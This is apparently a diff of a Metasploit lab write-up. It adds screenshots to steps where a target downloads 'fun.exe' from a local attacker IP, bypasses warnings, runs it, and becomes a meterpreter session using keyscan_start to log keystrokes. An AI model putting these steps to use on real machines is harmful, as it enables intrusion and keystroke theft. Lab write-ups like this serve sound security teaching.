@@ -73,11 +73,13 @@ http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
 ## OUTPUT:
 
+<img width="1264" height="527" alt="Screenshot 2025-11-27 002733" src="https://github.com/user-attachments/assets/302b3fa8-62a1-4dba-b2c9-f618c36d12a8" />
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
 
+<img width="1494" height="1078" alt="Screenshot 2025-11-27 002821" src="https://github.com/user-attachments/assets/79b264a4-9538-4fe7-97e6-95d791ec82f4" />
 
 
 On kali/parrot give the command exploit
@@ -109,6 +111,10 @@ Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 ## OUTPUT:
+## notepade screenshot :
+<img width="1494" height="1073" alt="Screenshot 2025-11-27 004053" src="https://github.com/user-attachments/assets/eed7b3cc-e583-4fc6-8494-d659a645dc50" />
+
+
 
 ![Alt text](img1/12.png)
 
